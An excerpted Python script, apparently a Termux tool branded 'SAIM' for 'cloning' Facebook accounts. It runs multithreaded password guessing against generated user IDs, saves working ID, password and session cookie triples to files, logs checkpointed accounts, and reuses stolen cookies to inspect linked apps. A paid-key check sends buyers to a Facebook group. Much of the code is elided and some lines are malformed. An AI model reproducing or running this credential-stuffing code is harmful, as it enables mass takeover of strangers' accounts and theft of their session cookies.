...
def cek_apk(session,coki):
    w=session.get("https://facebook.com/groups/338329513982094/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    ...
    w=session.get("https://facebook.com/groups/338329513982094/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[𝗦𝗔𝗜𝗠-EHC')
...
def menu():
	...
	banner()
	print('\033[38;5;46m══════════════════════════════════')
	print(f'\033[38;5;46m[𝗦𝗔𝗜𝗠𝟭]𝑭𝑰𝑳𝑬 𝑪𝑳𝑶𝑵𝑬 𝑵𝑶𝑻 𝑾𝑶𝑹𝑲❌')
	print('\033[38;5;46m══════════════════════════════════')
	print(f'\033[38;5;46m[𝗦𝗔𝗜𝗠𝟮]𝑹𝑨𝑵𝑫𝑶𝑴 𝑪𝑳𝑶𝑵𝑬 𝑵𝑶𝑻 𝑾𝑶𝑹𝑲❌')
	print('\033[38;5;46m══════════════════════════════════')
	print(f'\033[38;5;46m[𝗦𝗔𝗜𝗠𝟯]𝑬𝑴𝑨𝑰𝑳 𝑪𝑳𝑶𝑵𝑬 𝑾𝑶𝑹𝑲𝑰𝑵𝑮 (𝑩𝑨𝑺𝑻✅)')
	print('\033[38;5;46m══════════════════════════════════')
	print(f'\033[38;5;46m[𝗦𝗔𝗜𝗠𝟰]𝑪𝑶𝑵𝑻𝑨𝑪𝑻 𝑴𝑬')
	print('\033[38;5;46m══════════════════════════════════')
	print(f'\033[38;5;46m[𝗦𝗔𝗜𝗠𝟱]𝑬𝑿𝑰𝑻 𝑭𝑼𝑪𝑲 𝒀𝑶𝑼 🚥')
	print('\033[38;5;46m══════════════════════════════════')
	_____𝗦𝗔𝗜𝗠_____ = input('\033[1;92m[\033[1;34mEHC\033[1;92m]\033[0;92m𝑪𝑯𝑶𝑶𝑺𝑬✏️ :\x1b[1;92m ')
	if _____𝗦𝗔𝗜𝗠_____ in ['1']:
		C1()
	if _____𝗦𝗔𝗜𝗠_____ in ['2']:
		Y2()
	if _____𝗦𝗔𝗜𝗠_____ in ['3']:
		BER()
	if _____𝗦𝗔𝗜𝗠_____ in ['4']:
		os.system("xdg-open https://facebook.com/groups/338329513982094/ ")
	if _____𝗦𝗔𝗜𝗠_____ in ['0']:
		exit()			
def tahunng(fx):
	if len(fx)==15:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [𝗦𝗔𝗜𝗠] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91m𝗦𝗔𝗜𝗠-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				print(f'\r\x1b[1;92m [\033[1;92m𝗦𝗔𝗜𝗠-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				cek_apk(session,coki)
				open('/sdcard/𝗦𝗔𝗜𝗠-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break				
			else:
				continue
...
def Y2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as 𝗦𝗔𝗜𝗠:
        clear()
        tl = str(len(user))
        print('\033[38;5;46m══════════════════════════════════')
        ...
        print('\033[38;5;46m══════════════════════════════════')
        print(f"\033[1;92m[\033[1;32m\033[1;92m]\033[38;5;46m 𝑺𝑰𝑴 ??𝑶𝑫𝑬       \033[1;34m: \033[38;5;46m"+code)
        print('\033[38;5;46m══════════════════════════════════')
...
def BER():
    ...
    with ThreadPool(max_workers=50) as yaari:
        ...
        print('\033[38;5;46m══════════════════════════════════')
        print('\033[1;92m[\033[1;32m\033[1;92m]\033[38;5;46m𝑬𝑯𝑪 𝑪𝒀𝑩𝑬𝑹 𝟗𝟗 𝗦𝗔𝗜𝗠 ')
        print('\033[38;5;46m══════════════════════════════════')
...
def rcerek(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
        	...
        	free_fb = session.get('https://www.facebook.com/profile.php?id=100068072949871').text
        	log_data = {
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    continue
        loop+=1
        brand=random.choice(['𝗦𝗔𝗜𝗠 CYBER','𝗦𝗔𝗜𝗠-CYBER ','𝗦𝗔𝗜𝗠 CRACK '])
        ...
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46m𝗦𝗔𝗜𝗠-??𝗬𝗕𝗘𝗥💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
        sys.stdout.write('\r%s[𝗦𝗔𝗜𝗠-EHC]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()	
    except:
     pass
def 𝗦𝗔𝗜𝗠(uid,pwv,tl):
    ...
    try:
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟ᎶꫝᴍᴇᏒ✮⃝ᎬᴍRꫝɴ𝄟⃝\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-\33[1;90m[{emoji}]  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46m𝗦𝗔𝗜𝗠-𝗖𝗬𝗕𝗘𝗥💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
        sys.stdout.write('\r%s[𝗦𝗔𝗜𝗠-EHC]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
...
def mex():
    ...
    try:
        ...
        os.system('am start https://facebook.com/groups/338329513982094/?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20𝗦𝗔𝗜𝗠%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
    r = requests.get('https://facebook.com/groups/338329513982094/𝗦𝗔𝗜𝗠/approved.txt/main/approved.%20txt').text
    if key1 in r:
        ...
        os.system('am starthttps://facebook.com/groups/338329513982094/?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20𝗦𝗔𝗜𝗠%20Paid%20Tools.%20My%20Key:%20'+key1)
        mex()
